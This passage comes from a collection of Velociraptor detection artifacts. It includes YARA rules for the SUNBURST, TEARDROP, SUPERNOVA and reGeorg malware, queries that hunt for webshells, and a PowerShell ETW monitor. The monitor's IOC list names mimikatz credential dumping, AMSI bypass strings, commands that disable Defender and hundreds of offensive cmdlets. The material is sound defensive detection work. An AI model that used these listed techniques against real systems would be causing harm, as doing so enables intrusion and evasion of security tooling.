                $p = "88lMzyjxLEnMyUwGAA==" wide
                $q = "C0pNL81JLAIA" wide
                $r = "C07NzXTKz0kBAA==" wide
                $s = "C07NzXTKz0nxLEnMyUwGAA==" wide
                $t = "yy9IzStOzCsGAA==" wide
                $u = "y8svyQcA" wide
                $v = "SytKTU3LzysBAA==" wide
                $w = "C84vLUpOdc5PSQ0oygcA" wide
                $x = "C84vLUpODU4tykwLKMoHAA==" wide
                $y = "C84vLUpO9UjMC07MKwYA" wide
                $z = "C84vLUpO9UjMC04tykwDAA==" wide
            condition:
                ($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($aa or $ab)) or ($t and $u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and $aj and $ak and $al and ($am or $an))
        }

        private rule APT_Backdoor_MSIL_SUNBURST_3
        {
            meta:
                author = "FireEye"
                description = "This rule is looking for certain portions of the SUNBURST backdoor that deal with C2 communications. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/SUNBURST/yara/APT_Backdoor_MSIL_SUNBURST_3.yar"
            
            strings:
                $sb1 = { 05 14 51 1? 0A 04 28 [2] 00 06 0? [0-16] 03 1F ?? 2E ?? 03 1F ?? 2E ?? 03 1F ?? 2E ?? 03 1F [1-32] 03 0? 05 28 [2] 00 06 0? [0-32] 03 [0-16] 59 45 06 }
                $sb2 = { FE 16 [2] 00 01 6F [2] 00 0A 1? 8D [2] 00 01 [0-32] 1? 1? 7B 9? [0-16] 1? 1? 7D 9? [0-16] 6F [2] 00 0A 28 [2] 00 0A 28 [2] 00 0A [0-32] 02 7B [2] 00 04 1? 6F [2] 00 0A [2-32] 02 7B [2] 00 04 20 [4] 6F [2] 00 0A [0-32] 13 ?? 11 ?? 11 ?? 6E 58 13 ?? 11 ?? 11 ?? 9? 1? [0-32] 60 13 ?? 0? 11 ?? 28 [4] 11 ?? 11 ?? 9? 28 [4] 28 [4-32] 9? 58 [0-32] 6? 5F 13 ?? 02 7B [2] 00 04 1? ?? 1? ?? 6F [2] 00 0A 8D [2] 00 01 }
                $ss1 = "\x00set_UseShellExecute\x00"
                $ss2 = "\x00ProcessStartInfo\x00"
                $ss3 = "\x00GetResponseStream\x00"
                $ss4 = "\x00HttpWebResponse\x00"
            
            condition:
                (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
        }

        private rule APT_Backdoor_MSIL_SUNBURST_4
        {
            meta:
                author = "FireEye"
                description = "This rule is looking for specific methods used by the SUNBURST backdoor. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/SUNBURST/yara/APT_Backdoor_MSIL_SUNBURST_4.yar"
            
            strings:
                $ss1 = "\x00set_UseShellExecute\x00"
                $ss2 = "\x00ProcessStartInfo\x00"
                $ss3 = "\x00GetResponseStream\x00"
                $ss4 = "\x00HttpWebResponse\x00"
                $ss5 = "\x00ExecuteEngine\x00"
                $ss6 = "\x00ParseServiceResponse\x00"
                $ss7 = "\x00RunTask\x00"
                $ss8 = "\x00CreateUploadRequest\x00"
            
            condition:
                (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
        }

        private rule APT_Dropper_Raw64_TEARDROP_1
        {
            meta:
                author = "FireEye"
                description = "This rule looks for portions of the TEARDROP backdoor that are vital to how it functions. TEARDROP is a memory only dropper that can read files and registry keys, XOR decode an embedded payload, and load the payload into memory. TEARDROP persists as a Windows service and has been observed dropping Cobalt Strike BEACON into memory."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/TEARDROP/yara/APT_Dropper_Raw64_TEARDROP_1.yar"
            
            strings:
                $sb1 = { C7 44 24 ?? 80 00 00 00 [0-64] BA 00 00 00 80 [0-32] 48 8D 0D [4-32] FF 15 [4] 48 83 F8 FF [2-64] 41 B8 40 00 00 00 [0-64] FF 15 [4-5] 85 C0 7? ?? 80 3D [4] FF }
                $sb2 = { 80 3D [4] D8 [2-32] 41 B8 04 00 00 00 [0-32] C7 44 24 ?? 4A 46 49 46 [0-32] E8 [4-5] 85 C0 [2-32] C6 05 [4] 6A C6 05 [4] 70 C6 05 [4] 65 C6 05 [4] 67 }
                $sb3 = { BA [4] 48 89 ?? E8 [4] 41 B8 [4] 48 89 ?? 48 89 ?? E8 [4] 85 C0 7? [1-32] 8B 44 24 ?? 48 8B ?? 24 [1-16] 48 01 C8 [0-32] FF D0 }
            
            condition:
                all of them
        }

        private rule APT_Dropper_Win64_TEARDROP_2
        {
            meta:
                author = "FireEye"
                description = "This rule is intended match specific sequences of opcode found within TEARDROP, including those that decode the embedded payload. TEARDROP is a memory only dropper that can read files and registry keys, XOR decode an embedded payload, and load the payload into memory. TEARDROP persists as a Windows service and has been observed dropping Cobalt Strike BEACON into memory."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/TEARDROP/yara/APT_Dropper_Win64_TEARDROP_2.yar"
            
            strings:
                $loc_4218FE24A5 = { 48 89 C8 45 0F B6 4C 0A 30 }
                $loc_4218FE36CA = { 48 C1 E0 04 83 C3 01 48 01 E8 8B 48 28 8B 50 30 44 8B 40 2C 48 01 F1 4C 01 FA }
                $loc_4218FE2747 = { C6 05 ?? ?? ?? ?? 6A C6 05 ?? ?? ?? ?? 70 C6 05 ?? ?? ?? ?? 65 C6 05 ?? ?? ?? ?? 67 }
                $loc_5551D725A0 = { 48 89 C8 45 0F B6 4C 0A 30 48 89 CE 44 89 CF 48 F7 E3 48 C1 EA 05 48 8D 04 92 48 8D 04 42 48 C1 E0 04 48 29 C6 }
                $loc_5551D726F6 = { 53 4F 46 54 57 41 52 45 ?? ?? ?? ?? 66 74 5C 43 ?? ?? ?? ?? 00 }
            
            condition:
                (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
        }

        import "pe"
        private rule SentinelLabs_SUPERNOVA
        {
            meta:
                description = "Identifies potential versions of App_Web_logoimagehandler.ashx.b6031896.dll weaponized with SUPERNOVA"
                date = "2020-12-22"
                author = "SentinelLabs"
                source = "https://labs.sentinelone.com/solarwinds-understanding-detecting-the-supernova-webshell-trojan/"
                
            strings:
                $ = "clazz"
                $ = "codes"
                $ = "args"
                $ = "ProcessRequest"
                $ = "DynamicRun"
                $ = "get_IsReusable"
                $ = "logoimagehandler.ashx" wide
                $ = "SiteNoclogoImage" wide
                $ = "SitelogoImage" wide

            condition:
                (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and pe.imports("mscoree.dll")) and all of them
        }

        rule SolarWindsArtifacts
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Artifacts common to the SolarWinds compromise."

            condition:
                APT_Backdoor_MSIL_SUNBURST_1 
                or APT_Backdoor_MSIL_SUNBURST_2 
                or APT_Backdoor_MSIL_SUNBURST_3 
                or APT_Backdoor_MSIL_SUNBURST_4 
                or APT_Dropper_Raw64_TEARDROP_1 
                or APT_Dropper_Win64_TEARDROP_2
                or SentinelLabs_SUPERNOVA
        }

        rule reGeorg_Variant_Web_shell {
            meta:
                description = "Matches the reGeorg variant web shell used by the actors."
                date = "2021-07-01"
                author = "National Security Agency"
                source = "https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
                
            strings:
                $pageLanguage = "<%@ Page Language=\"C#\""
                $obfuscationFunction = "StrTr"
                $target = "target_str"
                $IPcomms = "System.Net.IPEndPoint"
                $addHeader = "Response.AddHeader"
                $socket = "Socket"
                
            condition:
                5 of them
        }

sources:
  - name: YaraHits
    query: |
      LET webroot = SELECT * FROM switch(
        windows={SELECT WindowsWebRoot AS Dir FROM info() WHERE OS = "windows"},
        linux={SELECT LinuxWebRoot AS Dir FROM info() WHERE OS = "linux"}
      ) 
      LET webroot_dir <= webroot[0].Dir
      Select * FROM Artifact.Generic.Detection.Yara.Glob(PathGlob=webroot_dir, YaraRule=YaraRule, DateAfter=DateAfter)
  - name: WindowsProcessCreation
    precondition:
      SELECT OS From info() where OS = 'windows'
    query: |
      SELECT * FROM Artifact.Windows.EventLogs.Evtx(EvtxGlob='%SystemRoot%\\System32\\winevt\\Logs\\{*Sysmon*,Security}\.evtx', IDRegex="1|4688")
      WHERE ( Channel =~ 'sysmon' AND EventID = 1 AND EventData.ParentImage =~ WebserverProcessRegex AND EventData.Image =~ SpawnedProcessRegex )
        OR ( Channel =~ 'Security' AND EventID = 4688 AND EventData.ParentProcessName =~ WebserverProcessRegex AND EventData.NewProcessName =~ SpawnedProcessRegex )
  - name: FileSystemChanges
    query: |
      -- time test function (taken from Windows.NTFS.MFT)
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))
      
      LET webroot = SELECT * FROM switch(
        windows={SELECT WindowsWebRoot AS Dir FROM info() WHERE OS = "windows"},
        linux={SELECT LinuxWebRoot AS Dir FROM info() WHERE OS = "linux"}
      ) 
      LET webroot_dir <= webroot[0].Dir
      SELECT * FROM glob(globs=webroot_dir, accessor="auto")
      WHERE 
        NOT IsDir 
        AND (time_test(stamp=Btime) OR time_test(stamp=Mtime))
        AND Name =~ WebshellRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/PowershellMonitoring.yaml
======
name: Windows.ETW.Powershell
author: Matt Green - @mgreen27
description: |
    This artifact enables Powershell scriptblock and commandlet load monitoring.  
    It uses the ETW provider: Microsoft-Windows-PowerShell  
    
    Detection logic is managed by several global ignore entries and an IOC csv.  

    ##### Global Ignore  
    IgnoreProcessExe - Process exe path to ignore  
    IgnoreParentProcessExe - Parent exe path for child generated events to ignore  
    IgnoreParentProcessName - Ignore events generated by a child process 
      
    ##### IocCsv 
    Name - detection name  
    Type - type of detection: ScriptBlock,Commandlet or ScriptBlock|Commandlet  
    Regex - regex to search for  
    Ignore - regex to ignore  
    DateModified - date detection last modified  
    

type: CLIENT_EVENT

parameters:
  - name: IgnoreProcessExe
    description: Regex of process exe path to ignore
    default: \\Program Files\\(Microsoft Monitoring Agent\\Agent|Microsoft System Center\\Operations Manager\\Server)\\MonitoringHost\.exe$
  - name: IgnoreParentProcessExe
    description: Regex of parent exe path for child generated events to ignore
    default: ^(C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseIR\.exe|C:\\Program Files\\Microsoft SQL Server\\MSSQL\d{1,2}\.MSSQLSERVER\\MSSQL\\Binn\\SQLAGENT\.EXE)$
  - name: IgnorePaths
    description: "List of path regex to ignore. This list will be joined and excluded."
    default: |
        \\SDIAG_.{8}-(.{4}-){3}.{12}\\
        \\Windows Defender Advanced Threat Protection\\
        \\Microsoft Azure Backup Server\\
        \\Program Files\\Microsoft Dependency Agent\\
        \\(Program Files|ProgramData)\\Amazon\\(WorkSpaces|EC2-Windows)
        \\Program Files(|\(x86\))\\Symantec\\Symantec Endpoint
        \\Program Files(|\(x86\))\\Automox\\execDir
  - name: IocCsv
    type: csv
    description: "Application name Regex to enable filtering on source."
    default: |
        Name,Type,Regex,Ignore,DateModified
        T1059.001-Mimikatz Execution via PowerShell,ScriptBlock,TOKEN_PRIVILE|SE_PRIVILEGE_ENABLED|mimikatz|lsass.dmp,,12/8/2022
        T1059.001-Cobalt Strike Powershell Loader,ScriptBlock,\$Doit|-bxor 35,,12/8/2022
        TT1562-Impair Defences,ScriptBlock,powershell -version 2|Set-PSReadlineOption|-HistorySaveStyle SaveNothing|remove-module +psreadline|[Amsi]::Bypass()|{2781761E-28E0-4109-99FE-B9D127C57AFE}|amsiInitFailed|System.Management.Automation.AmsiUtils|Remove-EtwTraceProvider|System.Management.Automation.Tracing.PSEtwLogProvider|HKLM.SYSTEM.CurrentControlSet.Control.WMI.Autologger.AUTOLOGGER_NAME,,23/8/2022
        T1562.001-Win Defender Disable using Powershell,ScriptBlock,Set-MpPreference -DisableRealtimeMonitoring|Set-MpPreference DisableBehaviorMonitoring|Set-MpPreference -DisableScriptScanning|Set-MpPreference -DisableBlockAtFirstSeen|MpPreference -ExclusionPath,,12/8/2022
        T1059.001-Malicious Powershell Commandlets,Commandlet,Add-ConstrainedDelegationBackdoor|Add-DomainObjectAcl|Add-Exfiltration|Add-ObjectAcl|Add-Persistance|Add-Persistence|Add-RegBackdoor|Add-RemoteConnection|Add-ScrnSaveBackdoor|Add-ServiceDacl|Add-SignedIntAsUnsigned|Bloodhound|Check-VM|Convert-ADName|Convert-DNSRecord|Convert-FileRight|Convert-LDAPProperty|Convert-NameToSid|Convert-SwitchtoBool|Convert-UIntToInt|ConvertFrom-LDAPLogonHours|ConvertFrom-SID|ConvertFrom-UACValue|ConvertTo-LittleEndian|ConvertTo-LogonHoursArray|ConvertTo-RC4ByteStream|ConvertTo-SID|Copy-ArrayOfMemAddresses|Copy-VSS|Create-MultipleSessions|Create-NamedPipe|Create-ProcessWithToken|Create-RemoteThread|Create-SuspendedWinLogon|Create-WinLogonProcess|DataToEncode|Decrypt-Bytes|DNS_TXT_Pwnage|Do-Exfiltration|Download_Execute|Download-Execute-PS|DumpCerts|DumpCreds|Emit-CallThreadStub|Enable-Duplication|Enable-Privilege|Enable-SeAssignPrimaryTokenPrivilege|Enable-SeDebugPrivilege|Enabled-DuplicateToken|Enum-AllTokens|Exclude-Hosts|Execute-Command-MSSQL|Execute-DNSTXT-Code|Execute-OnTime|ExetoText|exfill|ExfilOption|Expand-Archive|Exploit-Jboss|Export-PowerViewCSV|FakeDC|Find-4624Logon|Find-4648Logon|Find-AppLockerLog|Find-AVSignature|Find-DomainLocalGroupMember|Find-DomainObjectPropertyOutlier|Find-DomainProcess|Find-DomainShare|Find-DomainUserEvent|Find-DomainUserLocation|Find-ForeignGroup|Find-ForeignUser|Find-Fruit|Find-GPOComputerAdmin|Find-GPOLocation|Find-InterestingDomainAcl|Find-InterestingDomainShareFile|Find-InterestingFile|Find-LocalAdminAccess|Find-ManagedSecurityGroups|Find-PathDLLHijack|Find-ProcessDLLHijack|Find-PSScriptsInPSAppLog|Find-RDPClientConnection|Find-TrustedDocuments|FireBuster|FireListener|Free-AllTokens|Get-ADObject|Get-AllAttributesForClass|Get-ApplicationHost|Get-CachedGPPPassword|Get-CachedRDPConnection|Get-ChromeDump|Get-ClipboardContents|Get-ComputerDetail|Get-DecryptedCpassword|Get-DecryptedSitelistPassword|Get-DelegateType|Get-DFSshare|Get-DNSRecord|Get-DNSZone|Get-Domain|Get-DomainComputer|Get-DomainController|Get-DomainDFSShare|Get-DomainDFSShareV1|Get-DomainDFSShareV2|Get-DomainDNSRecord|Get-DomainDNSZone|Get-DomainFileServer|Get-DomainForeignGroupMember|Get-DomainForeignUser|Get-DomainGPO|Get-DomainGPOComputerLocalGroupMapping|Get-DomainGPOLocalGroup|Get-DomainGPOUserLocalGroupMapping|Get-DomainGroup|Get-DomainGroupMember|Get-DomainGroupMemberDeleted|Get-DomainGUIDMap|Get-DomainManagedSecurityGroup|Get-DomainObject|Get-DomainOU|Get-DomainPolicy|Get-DomainSearcher|Get-DomainSID|Get-DomainSite|Get-DomainSPNTicket|Get-DomainSubnet|Get-DomainTrust|Get-DomainTrustMapping|Get-DomainUser|Get-DomainUserEvent|Get-Forest|Get-ForestDomain|Get-ForestGlobalCatalog|Get-ForestSchemaClass|Get-ForestTrust|Get-FoxDump|Get-GPODelegation|Get-GPPInnerField|Get-GPPPassword|Get-GptTmpl|Get-GroupsXML|Get-Hex|Get-HttpStatus|Get-ImageNtHeaders|Get-IndexedItem|Get-Information|Get-IniContent|Get-IPAddress|Get-Keystrokes|Get-LastLoggedOn|Get-LoggedOnLocal|Get-LSASecret|Get-MemoryProcAddress|Get-MicrophoneAudio|Get-ModifiablePath|Get-ModifiableRegistryAutoRun|Get-ModifiableScheduledTaskFile|Get-ModifiableService|Get-ModifiableServiceFile|Get-NetComputer|Get-NetComputerSiteName|Get-NetDomain|Get-NetDomainController|Get-NetDomainTrust|Get-NetFileServer|Get-NetForest|Get-NetGPO|Get-NetGroup|Get-NetGroupMember|Get-NetLocalGroup|Get-NetLoggedon|Get-NetOU|Get-NetProcess|Get-NetRDPSession|Get-NetSession|Get-NetShare|Get-NetSite|Get-NetSubnet|Get-NetUser|Get-ObjectAcl|Get-PassHashes|Get-PassHints|Get-PathAcl|Get-PEArchitecture|Get-PEBasicInfo|Get-PEDetailedInfo|Get-PrimaryToken|Get-PrincipalContext|Get-ProcAddress|Get-ProcessTokenGroup|Get-ProcessTokenPrivilege|Get-ProcessTokenType|Get-Property|Get-Proxy|Get-RandomName|Get-RegAlwaysInstallElevated|Get-RegAutoLogon|Get-RegistryAlwaysInstallElevated|Get-RegistryAlwaysInstallElevated.|Get-RegistryAutoLogon|Get-RegistryMountedDrive|Get-RegLoggedOn|Get-RemoteProcAddress|Get-RemoteProcAddressFunction|Get-RickAstley|Get-Screenshot|Get-SecurityPackages|Get-ServiceDetail|Get-ServiceFilePermission|Get-ServicePermission|Get-ServiceUnquoted|Get-SitelistField|Get-SiteListPassword|Get-SiteName|Get-System|Get-SystemNamedPipe|Get-SystemToken|Get-ThreadToken|Get-TimedScreenshot|Get-TokenInformation|Get-TopPort|Get-UnattendedInstallFile|Get-Unconstrained|Get-UniqueTokens|Get-UnquotedService|Get-USBKeystrokes|Get-UserEvent|Get-VaultCredential|Get-VaultElementValue|Get-VirtualProtectValue|Get-VolumeShadowCopy|Get-VulnAutoRun|Get-VulnSchTask|Get-Web-Credentials|Get-WebConfig|Get-Win32Constants|Get-Win32Functions|Get-Win32Types|Get-WLAN-Keys|Get-WMIProcess|Get-WMIRegCachedRDPConnection|Get-WMIRegLastLoggedOn|Get-WMIRegMountedDrive|Get-WMIRegProxy|Gupt-Backdoor|HTTP-Backdoor|HTTP-Login|Import-DllImports|Import-DllInRemoteProcess|Inject-LocalShellcode|Inject-RemoteShellcode|Install-ServiceBinary|Install-SSP|InttoIP|Invoke-ACLScanner|Invoke-ADSBackdoor|Invoke-AllChecks|Invoke-AmsiBypass|Invoke-ARPScan|Invoke-AzureHound|Invoke-BackdoorLNK|Invoke-BadPotato|Invoke-BetterSafetyKatz|Invoke-BruteForce|Invoke-BypassUAC|Invoke-Carbuncle|Invoke-Certify|Invoke-CheckLocalAdminAccess|Invoke-CompareAttributesForClass|Invoke-CreateRemoteThread|Invoke-CredentialInjection|Invoke-CredentialsPhish|Invoke-DAFT|Invoke-DCSync|Invoke-Decode|Invoke-DinvokeKatz|Invoke-DllInjection|Invoke-DowngradeAccount|Invoke-EgressCheck|Invoke-Empire|Invoke-Encode|Invoke-EnumerateLocalAdmin|Invoke-EventHunter|Invoke-EventVwrBypass|Invoke-Eyewitness|Invoke-FakeLogonScreen|Invoke-Farmer|Invoke-FileFinder|Invoke-Get-RBCD-Threaded|Invoke-Gopher|Invoke-GPOLinks|Invoke-Grouper2|Invoke-HandleKatz|Invoke-ImpersonateUser|Invoke-Interceptor|Invoke-Internalmonologue|Invoke-Inveigh|Invoke-InveighRelay|Invoke-JSRatRegsvr|Invoke-JSRatRundll|Invoke-Kerberoast|Invoke-KrbRelayUp|Invoke-LdapSignCheck|Invoke-Lockless|Invoke-MapDomainTrust|Invoke-MemoryFreeLibrary|Invoke-MemoryLoadLibrary|Invoke-Method|Invoke-MITM6|Invoke-NanoDump|Invoke-NetRipper|Invoke-NetworkRelay|Invoke-NinjaCopy|Invoke-OxidResolver|Invoke-P0wnedshell|Invoke-Paranoia|Invoke-PatchDll|Invoke-PortScan|Invoke-PoshRatHttp|Invoke-PoshRatHttps|Invoke-PostExfil|Invoke-Potato|Invoke-PowerDump|Invoke-PPLDump|Invoke-Prasadhak|Invoke-PrintNightmare|Invoke-PrivescAudit|Invoke-ProcessHunter|Invoke-PsExec|Invoke-PSGcat|Invoke-PsGcatAgent|Invoke-PSInject|Invoke-PsUaCme|Invoke-ReflectivePEInjection|Invoke-ReverseDNSLookup|Invoke-ReverseDnsLookup|Invoke-RevertToSelf|Invoke-Rubeus|Invoke-RunAs|Invoke-SafetyKatz|Invoke-SauronEye|Invoke-SCShell|Invoke-Seatbelt|Invoke-ServiceAbuse|Invoke-SessionGopher|Invoke-ShareFinder|Invoke-SharpAllowedToAct|Invoke-SharpBlock|Invoke-SharpBypassUAC|Invoke-SharpChromium|Invoke-SharpClipboard|Invoke-SharpCloud|Invoke-SharpDPAPI|Invoke-SharpDump|Invoke-SharPersist|Invoke-SharpGPO-RemoteAccessPolicies|Invoke-SharpGPOAbuse|Invoke-SharpHandler|Invoke-SharpHide|Invoke-Sharphound|Invoke-SharpImpersonation|Invoke-SharpImpersonationNoSpace|Invoke-SharpKatz|Invoke-SharpLdapRelayScan|Invoke-Sharplocker|Invoke-SharpLoginPrompt|Invoke-SharpMove|Invoke-SharpPrinter|Invoke-SharpPrintNightmare|Invoke-SharpRDP|Invoke-SharpSecDump|Invoke-Sharpshares|Invoke-SharpSniper|Invoke-SharpSploit|Invoke-SharpSpray|Invoke-SharpSSDP|Invoke-SharpStay|Invoke-SharpUp|Invoke-Sharpview|Invoke-SharpWatson|Invoke-Sharpweb|Invoke-Shellcode|Invoke-ShellCommand|Invoke-SMBAutoBrute|Invoke-SMBScanner|Invoke-Snaffler|Invoke-Spoolsample|Invoke-SSHCommand|Invoke-SSIDExfil|Invoke-StandIn|Invoke-StickyNotesExtract|Invoke-Tater|Invoke-ThreadedFunction|Invoke-Thunderfox|Invoke-ThunderStruck|Invoke-TokenManipulation|Invoke-Tokenvator|Invoke-UrbanBishop|Invoke-UserHunter|Invoke-UserImpersonation|Invoke-VoiceTroll|Invoke-Whisker|Invoke-WinEnum|Invoke-winPEAS|Invoke-WireTap|Invoke-WmiCommand|Invoke-WScriptBypassUAC|Invoke-Zerologon|Jitter|Kerberoast|Kerbroast|Keylogger|LoggedKeys|MailRaider|Mimikat|Mimikittenz|Mount-VolumeShadowCopy|NetShareEnum|NetWkstaUserEnum|New-ADObjectAccessControlEntry|New-DomainGroup|New-DomainUser|New-DynamicParameter|New-HoneyHash|New-InMemoryModule|New-ScriptBlockCallback|New-ThreadedFunction|New-VolumeShadowCopy|Nishang|NotAllNameSpaces|Out-CHM|Out-CompressedDll|OUT-DNSTXT|Out-EncodedCommand|Out-EncryptedScript|Out-HTA|Out-Minidump|Out-RundllCommand|Out-SCF|Out-Shortcut|Out-WebQuery|Out-Word|Parse_Keys|Parse-Hosts|Parse-ILHosts|Parse-IPList|Parse-IpPorts|Parse-Pkt|Parse-Ports|ParseKeys|Password-List|Port-Scan|PortScan-Alive|Portscan-Port|PowerBreach|Powerpreter|PowerUp|PowerView|Remove-DomainGroupMember|Remove-DomainObjectAcl|Remove-Persistence|Remove-Ports|Remove-PoshRat|Remove-RemoteConnection|Remove-Update|Remove-VolumeShadowCopy|Request-SPNTicket|Resolve-IPAddress|Restore-ServiceBinary|Run-EXEonRemote|Set-ADObject|Set-DCShadowPermissions|Set-DesktopACLs|Set-DesktopACLToAllowEveryone|Set-DomainObject|Set-DomainObjectOwner|Set-DomainUserPassword|Set-FilelessBypassUac|Set-MacAttribute|Set-PowerStego|Set-Property|Set-RemotePSRemoting|Set-RemoteWMI|Set-ServiceBinaryPath|Set-Wallpaper|Sharphound|Shellcode|Shellcode32|Shellcode64|Show-TargetScreen|Split-Path|Start-CaptureServer|Start-Dnscat|Start-WebcamRecorder|StringtoBase64|Sub-SignedIntAsUnsigned|Test-AdminAccess|Test-IsAdmin|Test-MemoryRangeValid|Test-ServiceDaclPermission|TexttoExe|Update-ExeFunctions|Update-MemoryAddresses|Update-MemoryProtectionFlags|VolumeShadowCopyTools|Write-BytesToMemory|Write-HijackDll|Write-PortscanOut|Write-ServiceBinary|Write-UserAddMSI,,12/8/2022
        T1059.01-Powershell Malicious Keywords,ScriptBlock|Commandlet,AdjustTokenPrivileges|IMAGE_NT_OPTIONAL_HDR64_MAGIC|Microsoft.Win32.UnsafeNativeMethods|ReadProcessMemory.Invoke|SE_PRIVILEGE_ENABLED|LSA_UNICODE_STRING|MiniDumpWriteDump|PAGE_EXECUTE_READ|SECURITY_DELEGATION|TOKEN_ADJUST_PRIVILEGES|TOKEN_ALL_ACCESS|TOKEN_ASSIGN_PRIMARY|TOKEN_DUPLICATE|TOKEN_ELEVATION|TOKEN_IMPERSONATE|TOKEN_INFORMATION_CLASS|TOKEN_PRIVILEGES|TOKEN_QUERY|System.Reflection.Assembly.Load|[System.Reflection.Assembly]::Load|[Reflection.Assembly]::Load|System.Reflection.AssemblyName|Reflection.Emit.AssemblyBuilderAccess|Runtime.InteropServices.DllImportAttribute|SuspendThread|Metasploit|Mimikatz|PS ATTACK,,12/8/2022
        T1059.001-Loading Powershell in Memory,ScriptBlock|Commandlet,System.Reflection.AssemblyName|System.Reflection.Emit.AssemblyBuilderAccess|System.Runtime.InteropServices.MarshalAsAttribute|memorystream,,12/8/2022
        
sources:
  - query: |
      -- materialize ignore path regex where exist and not \s
      LET ScriptIgnore = SELECT _value as PathRegex 
        FROM foreach(row=split(string=IgnorePaths,sep='\n')) 
        WHERE PathRegex AND NOT PathRegex =~ '^\\s+$'
      LET ScriptIgnorePath <= join(array=ScriptIgnore.PathRegex,sep='|')
      
      -- materialize scriptblock regex for initial pass
      LET ScriptBlock = SELECT Regex,Type FROM IocCsv WHERE Type =~ 'ScriptBlock'
      LET ScriptBlockRegex <= join(array=ScriptBlock.Regex,sep='|')
      
      -- materialize Commandlet regex for initial pass
      LET Commandlet = SELECT Regex,Type FROM IocCsv WHERE Type =~ 'Commandlet'
      LET CommandletRegex <= join(array=Commandlet.Regex,sep='|')
      
      -- watch ETW provider and first round data manipulation
      LET hits = SELECT 
            timestamp(epoch=timestamp(string=System.TimeStamp).unix) as EventTime,
            System.ID as EventID,
            System.ProcessID as ProcessID,
            get(member="EventData") AS EventData
      FROM watch_etw(guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}") 
      WHERE ( EventData.ScriptBlockText OR EventData.Payload =~ '^Command .+ is Started\.\r\n$' )
        AND ( EventData.ScriptBlockText =~ ScriptBlockRegex
           OR EventData.Payload =~ CommandletRegex )
      
      -- print rows
      SELECT * FROM foreach(row=hits,query={
            SELECT
                EventTime,
                dict(
                    Name=Name,
                    Type=Type,
                    Regex=Regex,
                    Ignore=Ignore
                ) as Detection,
                EventID,
                if(condition= EventID=4104,
                    then= EventData.ScriptBlockText,
                    else= regex_replace(
                            source=EventData.Payload,
                            re='^Command | is Started\.\r\n$',
                            replace=''
                    )) as Payload,
                if(condition= EventID=4104,
                    then= EventData,
                    else= dict(Payload=EventData.Payload,
                        ContextInfo=parse_string_with_regex(string=EventData.ContextInfo,
                        regex=[
                            'Severity = (?P<Severity>[^\\r]*)',
                            'Host Name = (?P<HostName>[^\\r]*)',
                            'Host Version = (?P<HostVersion>[^\\r]*)',
                            'Host ID = (?P<HostID>[^\\r]*)',
                            'Host Application = (?P<HostApplication>[^\\r]*)',
                            'Engine Version = (?P<EngineVersion>[^\\r]*)',
                            'Runspace ID = (?P<RunspaceID>[^\\r]*)',
                            'Pipeline ID = (?P<PipelineID>[^\\r]*)',
                            'Command Name= (?P<CommandName>[^\\r]*)',
                            'CommandType = (?P<CommandType>[^\\r]*)',
                            'Script Name = (?P<ScriptName>[^\\r]*)',
                            'Command Path = (?P<CommandPath>[^\\r]*)',
                            'Sequence Number = (?P<SequenceNumber>[^\\r]*)',
                            'User = (?P<User>[^\\r]*)',
                            'Connected User = (?P<ConnectedUser>[^\\r]*)',
                            'Shell ID = (?P<ShellID>[^\\r]*)'
                        ]),
                        UserData=EventData.UserData)) as EventData,
                process_tracker_callchain(id=ProcessID).Data[-1] as ProcessInfo,
                process_tracker_callchain(id=ProcessID).Data as ProcessChain
            FROM IocCsv
            WHERE 
                if(condition= EventID=4104, then= Type=~'ScriptBlock',else= Type=~'Commandlet' )
                AND NOT if(condition=IgnoreProcessExe, 
                    then= ProcessInfo.Exe =~ IgnoreProcessExe, else= False)
                AND NOT if(condition=IgnoreParentProcessExe, 
                    then= ProcessChain.Exe[-2] =~ IgnoreParentProcessExe, else= False)
                AND Payload =~ Regex 
                AND NOT if(condition=Ignore, then= Payload=~Ignore, else= False)
                AND NOT if(condition=IgnorePaths,
                    then= EventData.Path =~ ScriptIgnorePath 
                        OR EventData.ContextInfo.CommandPath =~ ScriptIgnorePath
                        OR EventData.ContextInfo.ScriptName =~ ScriptIgnorePath,
                            else= False)
            LIMIT 1 -- limts to 1 row per IocCsv entry.
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.IncorrectPermissions.yaml
======
name: Linux.Detection.IncorrectPermissions
author: Andreas Misje – @misje
description: |
    NOTE: Requires velociraptor 0.7.1 or higher. – Alternatively, import the
    artifact dependency Linux.Sys.Groups manually into your installation.

    This artifacts checks a number of files and directories to verify whether
    they have the expected owner, group owner and mode. A file with an incorrect
    owner may allow attackers to modify important system files. Similarly,
    incorrect mode, like word-writable configuration or passwd/shadow files may
    also be signs of serious misconfiguration or signs of malicious activity.

    The parameter FilesToInspect contains lines of globs to search for. Each
    line may specify expected user, expected group, expected file mode and
    expected directory mode. It is very important that the order of the lines
    is in order of increasing specificity. For example:

    ```csv
    /etc/*,root,root,644,755
    /etc/?shadow*,,shadow,640,
    ```

    Here, every file in the directory /etc is expected to be owned by root:root
